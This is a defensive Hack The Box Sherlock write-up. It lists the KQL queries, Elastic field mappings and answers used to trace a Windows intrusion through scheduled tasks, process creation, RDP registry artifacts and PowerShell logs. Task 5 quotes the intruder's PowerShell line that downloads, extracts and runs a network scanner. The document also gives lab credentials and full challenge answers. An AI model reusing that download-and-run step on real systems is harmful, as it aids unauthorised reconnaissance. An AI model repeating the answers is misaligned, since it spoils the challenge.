# HTB Sherlock: TaskForce — KQL Query & Field Reference

A technical companion to the incident report, documenting the exact Kibana/KQL queries, exported fields, and evidence used to answer each hunt question. Intended to show the query logic and field-mapping troubleshooting behind the investigation — not just the answers.

**Platform:** HTB Sherlocks | **SIEM:** Elastic Stack (Kibana Discover) | **Access:** `elastic:hacktheblue`

---

## A note on field mapping

This Elastic instance uses a mix of raw Winlogbeat fields (`winlog.event_data.*`) and ECS-normalized fields (`process.executable`, `user.name`, `event.code`). Several fields assumed from standard Winlogbeat conventions (`winlog.event_data.TargetObject`, `.Details`, `.ScriptBlockText`, `.ScriptBlockId`, `winlog.event_id`) **do not exist** in this instance. The correct equivalents turned out to be ECS-mapped:

| Assumed (wrong) | Actual working field |
|---|---|
| `winlog.event_data.TargetObject` | `registry.path`, `registry.key` |
| `winlog.event_data.Details` | `registry.value`, `registry.data.strings` |
| `winlog.event_data.ScriptBlockText` | `powershell.file.script_block_text` |
| `winlog.event_data.ScriptBlockId` | `powershell.file.script_block_id` |
| `winlog.event_id` | `event.code` |

**Lesson:** don't assume a standard Winlogbeat/ECS field name maps 1:1 across every Elastic deployment — verify by expanding a raw document's JSON in Discover before building queries or exports around a guessed field name.

---

## Task 1 — Identify the out-of-place scheduled task

**KQL:**
```
winlog.channel:"Microsoft-Windows-TaskScheduler/Operational"
```

**Fields to export:**
`@timestamp`, `host.name`, `winlog.channel`, `winlog.event_data.TaskName`, `event.code`

**Method:** Export all rows, then in a spreadsheet/pandas, get distinct values of `TaskName` and filter out everything under `\Microsoft\Windows\...` (built-in tasks). Inspect what remains.

**Finding:** Two visually similar task names existed:
- `\SQLConnectivityCheck` — hosts `alliance-ws07`, `alliance-ws04`
- `\SQLConnectvityCheck` (typo, missing "i") — host `alliance-central` **only**

**Answer:** `SQLConnectvityCheck` (the typo'd task, unique to the SQL server)

---

## Task 2 — Identify the malicious executable

**KQL:**
```
event.code:"4688" and host.name:"alliance-central"
```

**Fields to export:**
`@timestamp`, `host.name`, `process.executable`, `winlog.event_data.SubjectUserName`, `winlog.event_data.TargetUserName`, `winlog.event_data.TokenElevationType`, `winlog.event_data.MandatoryLabel`, `winlog.event_data.SubjectLogonId`

**Method:** Get distinct values of `process.executable` for this host; look for a path outside normal Program Files / System32 install locations.

**Finding:**
```
2026-06-09 22:37:53.015
process.executable      : C:\Users\Public\Pictures\SQLBackup.exe
SubjectUserName          : ALLIANCE-CENTRA$   (SubjectLogonId 0x3e7 = SYSTEM)
TargetUserName            : john.shepard
TokenElevationType       : %%1937 (Full)
MandatoryLabel           : S-1-16-12288 (High Integrity)
```

**Answer:** `C:\Users\Public\Pictures\SQLBackup.exe`

> **Gotcha:** the SQL server's NetBIOS name is truncated to 15 characters (`ALLIANCE-CENTRA`) in task/script contexts, but its real hostname in Elastic is `alliance-central`. Querying with the truncated name returns zero results.

---

## Task 3 — First malicious login timestamp

**Step A — find the pivot Logon ID from a known-bad process:**
```
event.code:"4688" and process.executable:*netscan.exe*
```
Fields: `@timestamp`, `host.name`, `process.executable`, `winlog.event_data.SubjectLogonId`

Result: `netscan.exe` on `alliance-ws07`, `SubjectLogonId = 0x7b9417`.

**Step B — trace that Logon ID back to the earliest process in the session:**
```
winlog.event_data.SubjectLogonId:"0x7b9417" and host.name:"alliance-ws07"
```
Fields: `@timestamp`, `host.name`, `process.executable`, `winlog.event_data.SubjectUserName`, `winlog.event_data.TargetUserName`

Sort ascending by `@timestamp`. Earliest match:
```
2026-06-09 12:41:09.624 — TSTheme.exe
SubjectUserName: ALLIANCE-WS07$ (SYSTEM)   TargetUserName: John.shepard
```

**Answer:** `2026-06-09 12:41:09`

> Standard Security Event 4624 (successful logon) was unavailable for this session — Logon/Logoff auditing was not fully configured on this host. Pivoting on Logon ID across process-creation events was the workaround.

---

## Task 4 — Hostname of origin

**KQL:**
```
event.code:"13" and host.name:"alliance-ws07"
```
Time range narrowed to `2026-06-09 12:41:08 – 12:41:11` (right around the Task 3 timestamp).

**Fields to export:**
`@timestamp`, `host.name`, `event.code`, `registry.path`, `registry.key`, `registry.value`, `registry.data.strings`, `registry.hive`

**Finding:**
```
2026-06-09 12:41:09.833
registry.path  : HKU\S-1-5-21-...-1107\Volatile Environment\2\CLIENTNAME
registry.value : kali
registry.hive  : HKU
```

**Answer:** `kali`

> `CLIENTNAME` is auto-populated under `Volatile Environment` by Windows at RDP session start, recording the connecting client's hostname — a useful non-standard artifact when Security 4624 is unavailable.

---

## Task 5 — Recon tool download/execution command

**KQL:**
```
event.code:"4104" and user.name:"john.shepard" and host.name:"alliance-ws07"
```
Time range narrowed to `2026-06-09 12:55:00 – 12:56:00`.

**Fields to export:**
`@timestamp`, `host.name`, `user.name`, `powershell.file.script_block_id`, `powershell.file.script_block_text`

**Finding:**
```
2026-06-09 12:55:13.973
powershell.file.script_block_text:
  $url = "https://www.softperfect.com/download/files/netscan_portable.zip";
  $out = "C:\Users\Public\netscan_portable.zip";
  Invoke-WebRequest -Uri $url -OutFile $out;
  Expand-Archive $out -DestinationPath "C:\Users\Public\SoftPerfect";
  & "C:\Users\Public\SoftPerfect\x86_64\netscan.exe"
```

**Answer:**
```powershell
$url = "https://www.softperfect.com/download/files/netscan_portable.zip"; $out = "C:\Users\Public\netscan_portable.zip"; Invoke-WebRequest -Uri $url -OutFile $out; Expand-Archive $out -DestinationPath "C:\Users\Public\SoftPerfect"; & "C:\Users\Public\SoftPerfect\x86_64\netscan.exe"
```

---

## Task 6 — Source of compromise

No single query answers this — it's a synthesis across Tasks 2–5, all of which independently point to the same identity via a shared Logon ID (`0x7b9417`) and username (`john.shepard`/`John.Shepard`):

| Evidence | Task |
|---|---|
| RDP session origin (`kali`) tied to `John.shepard` | 3, 4 |
| Recon tool download & execution as `john.shepard` | 5 |
| SYSTEM-run payload impersonating `john.shepard` | 2 |

**KQL used to validate cross-host activity for the account:**
```
winlog.event_data.TargetUserName:"john.shepard" or user.name:"john.shepard"
```
Fields: `@timestamp`, `host.name`, `event.code`, `process.executable`, `winlog.event_data.TargetUserName`, `winlog.event_data.SubjectUserName`

**Answer:** `ALLIANCE\John.Shepard`

---

## Summary: Fields to export per task

| Task | Fields |
|---|---|
| 1 | `@timestamp`, `host.name`, `winlog.channel`, `winlog.event_data.TaskName`, `event.code` |
| 2 | `@timestamp`, `host.name`, `process.executable`, `winlog.event_data.SubjectUserName`, `winlog.event_data.TargetUserName`, `winlog.event_data.TokenElevationType`, `winlog.event_data.MandatoryLabel`, `winlog.event_data.SubjectLogonId` |
| 3 | `@timestamp`, `host.name`, `process.executable`, `winlog.event_data.SubjectLogonId`, `winlog.event_data.SubjectUserName`, `winlog.event_data.TargetUserName` |
| 4 | `@timestamp`, `host.name`, `event.code`, `registry.path`, `registry.key`, `registry.value`, `registry.data.strings`, `registry.hive` |
| 5 | `@timestamp`, `host.name`, `user.name`, `powershell.file.script_block_id`, `powershell.file.script_block_text` |
| 6 | `@timestamp`, `host.name`, `event.code`, `process.executable`, `winlog.event_data.TargetUserName`, `winlog.event_data.SubjectUserName` |

All queries and fields above were validated by exporting the underlying data to CSV and cross-checking values directly, rather than relying solely on Discover's rendered UI.
